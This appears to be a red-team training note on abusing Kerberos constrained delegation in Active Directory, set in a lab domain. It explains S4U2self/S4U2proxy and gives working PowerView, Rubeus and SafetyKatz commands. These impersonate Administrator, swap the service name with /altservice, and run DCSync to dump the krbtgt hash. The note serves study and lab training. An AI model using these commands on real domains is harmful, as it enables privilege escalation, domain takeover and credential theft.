
* Allows access only to specified services on specified computers as a user.
* Protocol Transition is used when a user authenticates to a web service without using Kerberos and the web service makes requests to a database server to fetch results based on the user's authorization.

* To impersonate the user, Service for User (S4U) extension is used which provides two extensions:
1. Service for User to Self (S4U2self) - Allows a service to obtain a forwardable TGS to itself on behalf of a user with just the user principal name without supplying a password.
2. Service for User to Proxy (S4U2proxy) - Allows a service to obtain a TGS to a second service on behalf of a user. Which second service? This is controlled by msDS-AllowedToDelegateTo attribute. This attribute contains a list of SPNs to which the user tokens can be forwarded.

```
[ USER (Joe) ]
             |
        (1) Auth (Non-Kerberos)
             |
             v          (2, 4) Request Ticket       +----------+
      [ WEB SERVER ] <--------------------------->  |    DC    |
      (svc: websvc)     (3, 5) Forwardable TGS      +----------+
             |                                       (KDC/S4U)
             | (6) Access as Joe (TGS)
             v
     [ DATABASE SERVER ]
     (svc: dcorp-mssql)
```


* To abuse constrained delegation in above scenario, we need to have access to the websvc account. If we have access to that account, it is possible to access the services listed in msDS-AllowedToDelegateTo of the websvc account as ANY user.

Enumerate users and computers with constrained delegation enabled

* Using PowerView
```
Get-DomainUser -TrustedToAuth
```

```
Get-DomainComputer -TrustedToAuth
```

*  Using ActiveDirectory module:
```
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```

* We can use the following command (We are requesting a TGT and TGS in a single command):
```
Rubeus.exe s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL /ptt
```

Then run :
```
ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$
```

* Another interesting issue here is that the SPN value in TGS is clear-text.
* This is huge as it allows access to many interesting services when the delegation may be for a non-intrusive service!

* We can use the following command (Note the '/altservice' parameter):
```
Rubeus.exe s4u /user:dcorp-adminsrv$ /aes256:db7bd8e34fada016eb0e292816040a1bf4eeb25cd3843e041d0278d30dc1b445 /impersonateuser:Administrator /msdsspn:time/dcorp-dc.dollarcorp.moneycorp.LOCAL
/altservice:ldap /ptt
```

* After injection, we can run DCSync:
```
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```

